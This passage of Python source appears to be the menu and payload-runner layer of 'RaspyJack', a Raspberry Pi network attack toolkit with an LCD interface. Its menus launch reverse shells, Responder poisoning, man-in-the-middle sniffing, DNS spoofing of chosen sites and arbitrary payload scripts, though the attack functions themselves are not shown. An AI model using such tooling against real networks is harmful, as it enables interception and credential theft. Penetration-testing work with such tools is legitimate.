    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (LCD.width, LCD.height), "BLACK")
    draw  = ImageDraw.Draw(image)

def pick_and_run_payload():
    """Open file picker rooted at payload directory to choose and run a payload.

    Accepts .py files directly or directories containing a payload.sh. Filters view
    to relevant files (.py and payload.sh) while still allowing directory descent.
    """
    base_path = default.payload_path
    selected = explorer(_widget_context, base_path, extensions=".py|.sh")
    if not selected:
        return
    rel = os.path.relpath(selected, base_path)
    # Block escape attempts
    if rel.startswith('..'):
        dialog_info(_widget_context, "Invalid path", wait=True, center=True)
        return
    exec_payload(rel)

def exec_payload(filename: str) -> None:
    """
    Executes a payload and ensures control always returns to the RaspyJack UI.
    """
    base = default.payload_path
    full_path = os.path.join(base, filename)
    run_label = filename
    command = None
    is_py = filename.endswith('.py')
    is_sh = filename.endswith('.sh')

    if is_py:
        if not os.path.isfile(full_path):
            dialog_info(_widget_context, f"Not found:\n{filename}", wait=True)
            return
        command = [sys.executable, "-u", full_path]
    elif is_sh:
        if not os.path.isfile(full_path):
            dialog_info(_widget_context, f"Not found:\n{filename}", wait=True)
            return
        # Use payload_executor to orchestrate arbitrary shell script
        command = [sys.executable, "-u", os.path.join(base, "payload_executor.py"), full_path]

    print(f"[PAYLOAD] ► Starting: {run_label}")
    if _event_bus is not None:
        try:
            _event_bus.emit("payload.before_exec", payload_name=run_label)
        except Exception:
            pass

    screen_lock.set()
    LCD.LCD_Clear()
    log = open(default.payload_log, "ab", buffering=0)
    try:
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=default.install_path, text=True, bufsize=1)
        if proc.stdout:
            for line in iter(proc.stdout.readline, ''):
                print(line, end='')
                log.write(line.encode('utf-8'))
        proc.wait()
    except Exception as exc:
        print(f"[PAYLOAD] E: {exc}")
    finally:
        log.close()

    print("[PAYLOAD] ◄ Restoring LCD & GPIO…")
    _setup_gpio()
    color.draw_menu_background()
    color.draw_border()
    LCD.LCD_ShowImage(image, 0, 0)
    t0 = time.time()
    while any(GPIO.input(p) == 0 for p in gpio_config.pins.values()) and time.time() - t0 < .3:
        time.sleep(.03)
    screen_lock.clear()
    if _event_bus is not None:
        try:
            _event_bus.emit("payload.after_exec", payload_name=run_label, success=True)
        except Exception:
            pass
    print("[PAYLOAD] ✔ Menu ready.")

# ============================================================================
# MenuManager Class
# ============================================================================
class MenuManager:
    """
    Manages the entire menu system, including navigation, rendering, and action execution.
    It uses a stack-based approach to handle nested menus.
    """
    def __init__(self, context: WidgetContext):
        self.context = context
        self.menus = {}
        self.menu_stack = []
        self.view_mode = "list"  # Default view mode for the main menu
        self.renderers = {
            "list": ListRenderer(context),
            "grid": GridRenderer(context),
            "carousel": CarouselRenderer(context)
        }
        # Track currently active Menu instance and its key so we can adjust
        # its renderer when view mode changes without needing an inline handler.
        self._active_menu = None
        self._active_menu_key = None
        self._build_menus()

    def _build_menus(self):
        """
        Initializes all the menus and their items.
        This is where the structure of the UI is defined.
        """
        # --- Main Menu ---
        self.menus["main"] = [
            MenuItem("Scan Nmap", "nmap", icon="\uf002", description="Network discovery and port scanning"),
            MenuItem("Reverse Shell", "reverse_shell", icon="\uf120", description="Establish reverse connections"),
            MenuItem("Responder", "responder", icon="\uf505", description="LLMNR, NBT-NS & MDNS poisoner"),
            MenuItem("MITM & Sniff", "mitm", icon="\uf6ff", description="Man-in-the-middle attacks"),
            MenuItem("DNS Spoofing", "dns_spoof", icon="\uf233", description="Redirect DNS queries"),
            MenuItem("Network info", show_info, icon="\ue012", description="Display network information"),
            MenuItem("WiFi Manager", "wifi", icon="\uf1eb", description="Manage wireless connections"),
            MenuItem("Other features", "other", icon="\uf085", description="Additional tools and configuration"),
            MenuItem("Read file", "read_file", icon="\uf15c", description="View captured data and results"),
            MenuItem("Payloads", pick_and_run_payload, icon="\uf121", description="Pick & execute a payload"),
            MenuItem("Plugins", "plugins", icon="\uf12e", description="Manage UI plugins"),
        ]

        # --- Submenus ---
        self.menus["nmap"] = [MenuItem(name, partial(run_scan, name, args)) for name, args in SCANS.items()]
        self.menus["reverse_shell"] = [MenuItem("Default Reverse", defaut_reverse), MenuItem("Remote Reverse", remote_reverse)]
        self.menus["responder"] = [MenuItem("Responder ON", responder_on), MenuItem("Responder OFF", responder_off)]
        self.menus["other"] = [
            MenuItem("Browse Images", lambda: browse_images(_widget_context, default.imgstart_path)),
            MenuItem("Options", "options"),
            MenuItem("System", "system")
        ]
        self.menus["options"] = [MenuItem("Colors", "colors"), MenuItem("Refresh config", load_config), MenuItem("Save config!", save_config)]
        self.menus["colors"] = [
            MenuItem("Background", partial(set_color, "background")),
            MenuItem("Border", partial(set_color, "border")),
            MenuItem("Text", partial(set_color, "text")),
            MenuItem("Selected text", partial(set_color, "selected_text")),
            MenuItem("Selected background", partial(set_color, "select")),
            MenuItem("Gamepad border", partial(set_color, "gamepad")),
            MenuItem("Gamepad fill", partial(set_color, "gamepad_fill")),
        ]
        self.menus["system"] = [MenuItem("Shutdown system", partial(leave, True)), MenuItem("Restart UI", restart_ui)]
        self.menus["read_file"] = [MenuItem("Nmap", read_text_file_nmap), MenuItem("Responder", read_text_file_responder), MenuItem("DNSSpoof", read_text_file_dnsspoof)]
        self.menus["mitm"] = [MenuItem("Start MITM & Sniff", start_mitm), MenuItem("Stop MITM & Sniff", stop_mitm)]
        self.menus["dns_spoof"] = [MenuItem("Start DNSSpoofing", start_dns_spoofing), MenuItem("Select site", "select_site"), MenuItem("Stop DNS&PHP", stop_dns_spoofing)]
        self.menus["select_site"] = [MenuItem(site, partial(spoof_site, site)) for site in SITES]

        # --- WiFi Menu (conditionally added) ---
        if WIFI_AVAILABLE:
            self.menus["wifi"] = [
                MenuItem("FAST WiFi Switcher", launch_wifi_manager),
                MenuItem("INSTANT Toggle 0<->1", quick_wifi_toggle),
                MenuItem("Switch Interface", switch_interface_menu),
                MenuItem("Show Interface Info", show_interface_info_action),
                MenuItem("Route Control", "route_control"),
            ]
            self.menus["route_control"] = [
                MenuItem("Show Routing Status", show_routing_status),
                MenuItem("Switch to WiFi", switch_to_wifi),
                MenuItem("Switch to Ethernet", switch_to_ethernet),
                MenuItem("Interface Switcher", launch_interface_switcher)
            ]
        else:
            self.menus["wifi"] = [MenuItem("WiFi Not Available", lambda: dialog_info(_widget_context, "WiFi system not found", wait=True))]


    def _build_plugins_menu(self):
        """Dynamically builds the plugins menu from the plugins configuration."""
        cfg = _rt_load_plugins_conf(default.install_path)
        entries = []

        # Create main plugin entries that lead to submenus
        for name in sorted(cfg.keys()):
            enabled = cfg[name].get('enabled', False)
            status_icon = "✓" if enabled else "✗"
            label = f"{status_icon} {name}"
            entries.append(MenuItem(label, f"plugin_{name}"))

        # Add general options
        entries.append(MenuItem("Save & Restart", lambda: (dialog_info(_widget_context, "Restarting UI...", wait=True), time.sleep(0.5), restart_ui())))

        self.menus["plugins"] = entries or [MenuItem("<no plugins>", lambda: None)]

        # Build submenus for each plugin
        self._build_plugin_submenus(cfg)
    
    def _build_plugin_submenus(self, cfg):
        """Build individual submenus for each plugin."""
        for plugin_name in cfg.keys():
            submenu_key = f"plugin_{plugin_name}"
            enabled = cfg[plugin_name].get('enabled', False)
            
            def _make_toggle(pname):
                def _toggle():
                    c = _rt_load_plugins_conf(default.install_path)
                    current_state = c.get(pname, {}).get('enabled', False)
                    c[pname]['enabled'] = not current_state
                    _rt_save_plugins_conf(c, default.install_path)
                    # Rebuild the plugin menu to reflect changes
                    self._build_plugins_menu()
                    status = 'Enabled' if not current_state else 'Disabled'
                    dialog_info(_widget_context, 
                              f"Plugin {pname}\n{status}\n\nSave & Restart to\napply changes!", 
                              wait=True, center=True)
                return _toggle
            
            def _make_info_viewer(pname):
                def _show_info():
                    try:
                        if '_plugin_manager' in globals() and _plugin_manager is not None:
                            info = _plugin_manager.get_plugin_info(pname)
                            if info:
                                lines = info.split('\n') if '\n' in info else [info]
                                scrollable_text_lines(_widget_context, lines, title=f"{pname} Info")
                            else:
                                dialog_info(_widget_context, f"No info available\nfor {pname}", wait=True)
                        else:
                            dialog_info(_widget_context, "Plugin manager\nnot available", wait=True)
                    except Exception as e:
                        dialog_info(_widget_context, f"Error getting info\n{str(e)[:20]}", wait=True)
                return _show_info
            
            def _make_config_toggle(pname, config_key):
                def _config_toggle_callback(new_state):
                    """Callback fired when checkbox is toggled."""
                    try:
                        # Update plugin manager
                        if '_plugin_manager' in globals() and _plugin_manager is not None:
                            _plugin_manager.set_plugin_config_value(pname, config_key, new_state)
                        
                        # Update and save persistent config
                        c = _rt_load_plugins_conf(default.install_path)
                        if pname not in c:
                            c[pname] = {}
                        if 'options' not in c[pname]:
                            c[pname]['options'] = {}
                        c[pname]['options'][config_key] = new_state
                        _rt_save_plugins_conf(c, default.install_path)
                    except Exception as e:
                        print(f"[PLUGIN] Config update error for {pname}.{config_key}: {e}")
                
                return _config_toggle_callback

            def _make_uninstall(pname):
                def _uninstall():
                    if not yn_dialog(_widget_context, question="Uninstall?", yes_text="Yes", no_text="No", second_line=pname[:20]):
                        return
                    try:
                        # Remove directory under plugins/<pname>
                        plug_dir = os.path.join(default.install_path, 'plugins', pname)
                        if os.path.isdir(plug_dir):
                            import shutil
                            shutil.rmtree(plug_dir, ignore_errors=True)
                        # Remove config entry
                        cfg_map = _rt_load_plugins_conf(default.install_path)
                        if pname in cfg_map:
                            del cfg_map[pname]
                            _rt_save_plugins_conf(cfg_map, default.install_path)
                        # Feedback & menu refresh
                        dialog_info(_widget_context, f"Plugin {pname}\nRemoved!\nRestart UI to\napply changes", wait=True, center=True)
                        # Rebuild menu list to reflect removal
                        self._build_plugins_menu()
                    except Exception as e:
                        try:
                            dialog_info(_widget_context, f"Uninstall error\n{str(e)[:18]}", wait=True, center=True)
                        except Exception:
                            pass
                return _uninstall
            
            # Create submenu for this plugin
            toggle_text = "Disable" if enabled else "Enable"
            submenu_items = [
                MenuItem(f"{toggle_text} Plugin", _make_toggle(plugin_name)),
                MenuItem("Show Information", _make_info_viewer(plugin_name)),
                MenuItem("Uninstall Plugin", _make_uninstall(plugin_name)),
            ]
            
            # Add plugin-specific configuration items if plugin is loaded and has configs
            try:
                if '_plugin_manager' in globals() and _plugin_manager is not None and enabled:
                    config_schema = _plugin_manager.get_plugin_config_schema(plugin_name)
                    if config_schema:
                        # Add separator if we have configs
                        submenu_items.append(MenuItem("─ Configuration ─", action=None))
                        
                        for config_key, config_def in config_schema.items():
                            if config_def.get('type') == 'boolean':
                                # Get current value from persistent config or default
                                current_value = cfg[plugin_name].get('options', {}).get(
                                    config_key, config_def.get('default', False))
                                
                                # Create checkbox with callback
                                config_checkbox = CheckboxMenuItem(
                                    config_def.get('label', config_key),
                                    checked=current_value,
                                    on_toggle=_make_config_toggle(plugin_name, config_key)
                                )
                                submenu_items.append(config_checkbox)
            except Exception as e:
                print(f"[PLUGIN] Error building config menu for {plugin_name}: {e}")

            # Append plugin-provided custom actions (if any)
            try:
                if '_plugin_manager' in globals() and _plugin_manager is not None and enabled:
                    inst = _plugin_manager.get_plugin_instance(plugin_name)
                    if inst and hasattr(inst, 'provide_menu_items'):
                        provided = inst.provide_menu_items() or []
                        built_items = []
                        for entry in provided:
                            if isinstance(entry, MenuItem):
                                built_items.append(entry)
                            elif isinstance(entry, tuple):
                                # tuple forms: (label, callable) or (label, callable, icon, description?)
                                label = None; action = None; icon = None; description = None
                                if len(entry) >= 2:
                                    label, action = entry[0], entry[1]
                                if len(entry) >= 3:
                                    icon = entry[2]
                                if len(entry) >= 4:
                                    description = entry[3]
                                if label and (callable(action) or isinstance(action, str)):
                                    built_items.append(MenuItem(label, action, icon=icon, description=description))
                        if built_items:
                            submenu_items.append(MenuItem("─ Actions ─", action=None))
                            submenu_items.extend(built_items)
            except Exception as e:
                print(f"[PLUGIN] Error adding custom menu items for {plugin_name}: {e}")
            
            self.menus[submenu_key] = submenu_items

    def toggle_view_mode(self):
        """Cycles through the available view modes for the main menu."""
        modes = ["list", "grid", "carousel"]
        current_index = modes.index(self.view_mode)
        self.view_mode = modes[(current_index + 1) % len(modes)]
        # If the active menu is the main menu, immediately swap its renderer
        if self._active_menu_key == "main" and self._active_menu is not None:
            self._active_menu.renderer = self.renderers[self.view_mode]
            # Ensure selection index still valid (item count unchanged but future-proof)
            self._active_menu._ensure_valid_selection()

    def show_menu(self, menu_key: str, force_refresh=False):
        """
        Displays a menu and handles user interaction.
        This is a single step in the main run loop.
        """
        # Rebuild dynamic menus just before they are displayed
        if menu_key == "plugins":
            self._build_plugins_menu()

        items = self.menus.get(menu_key, [])
        is_main_menu = (menu_key == "main")
        
        renderer = self.renderers[self.view_mode] if is_main_menu else self.renderers["list"]
        menu = Menu(self.context, renderer)
        menu.set_items(items)
        # Register active menu tracking
        self._active_menu = menu
        self._active_menu_key = menu_key

        if not force_refresh:
            self.menu_stack.append(menu_key)

        # KEY1_PIN cycles view modes on main menu; renderer update now handled inside toggle_view_mode
        custom_handlers = {"KEY1_PIN": self.toggle_view_mode} if is_main_menu else {}
        
        # This call blocks and waits for user input
        action = menu.run_interactive(custom_handlers=custom_handlers)

        if action is None:
            # User pressed 'back', so pop the current menu from the stack to go up one level
            if self.menu_stack and not force_refresh:
                self.menu_stack.pop()
        elif isinstance(action, str):
            # User selected a submenu, which will be handled by the main loop
            self.menu_stack.append(action)
        elif callable(action):
            # User selected an item with a function to execute.
            action()

    def run(self):
        """Run the menu system without blocking background overlay refresh."""
        self.menu_stack = ["main"]
        while self.menu_stack:
            current_menu_key = self.menu_stack.pop()
            self.show_menu(current_menu_key)


def main():
    """
    The main entry point of the application.
    Initializes hardware, starts background threads, and runs the menu system.
    """
    global _widget_context
    # Initialize high-level button event manager (non-blocking)
    try:
        init_button_events(gpio_config.pins, _stop_evt, plugin_dispatch=getattr(_plugin_manager, 'dispatch_button_event', None))
    except Exception as _iexc:
        print(f"[INPUT_EVENTS] Failed to init manager: {_iexc}")
    
    _widget_context = WidgetContext(
        draw=draw,
        lcd=LCD,
        image=image,
        color_scheme=color,
        get_button_event_func=_evt_get_button_event,
        fonts={'default': text_font, 'icon': icon_font},
        default_settings=default,
        status_bar=status_bar,
        plugin_manager=_plugin_manager
    )
    # After widget context creation, inject into plugin manager shared context
    try:
        if '_plugin_manager' in globals() and _plugin_manager is not None:
            # Update existing context dict inside plugin manager (if accessible)
            pm_ctx = getattr(_plugin_manager, '_ctx', None)
            if isinstance(pm_ctx, dict):
                pm_ctx['widget_context'] = _widget_context
                pm_ctx['plugin_manager'] = _plugin_manager
                pm_ctx['defaults'] = default
    except Exception:
        pass
    
    color.draw_menu_background()
    color.draw_border()
    start_background_loops()
    print(f"Booted in {time.time() - start_time:.2f} seconds! :)")

    menu_manager = MenuManager(_widget_context)
    
    # This loop ensures that the UI will restart if it ever exits.
    while True:
        try:
            menu_manager.run()
        except Exception as e:
            print(f"Menu Error: {e}")
            import traceback
            traceback.print_exc()
            dialog_info(_widget_context, "Menu system error.\nRestarting UI...", wait=True)
            time.sleep(2)
            restart_ui()

### Plugin system bootstrap ###
_event_bus = None
_plugin_manager = None

# Initialize central EventBus early so other subsystems can attach even if PluginManager is missing
try:
    from plugins.event_bus import EventBus as _CentralBus
    _event_bus = _CentralBus()
except Exception as _eb_exc:
    print(f"[EVENT_BUS] Init failed: {_eb_exc}")

if 'PluginManager' in globals() and PluginManager is not None:
    try:
        plugins_cfg_path = os.path.join(default.install_path, 'plugins', 'plugins_conf.json')
        if not os.path.exists(plugins_cfg_path):
            print("[PLUGIN] Creating default plugins_conf.json")
            _rt_save_plugins_conf({}, default.install_path)
        # Auto-install any pending plugin archives dropped into plugins/install
        installed = _rt_install_archives(default.install_path)
        if installed:
            print(f"[PLUGIN] Installed new plugins from archives: {', '.join(installed)}")
        if _plugin_manager is None:
            _plugin_manager = PluginManager(event_bus=_event_bus)
        reload_plugins()
    except Exception as e:
        print(f"[PLUGIN] Error during plugin bootstrap: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nCaught Ctrl+C, exiting...")
    except Exception as e:
        print(f"An unhandled exception occurred: {e}")
        import traceback
        traceback.print_exc()
    finally:
        leave(poweroff=False)
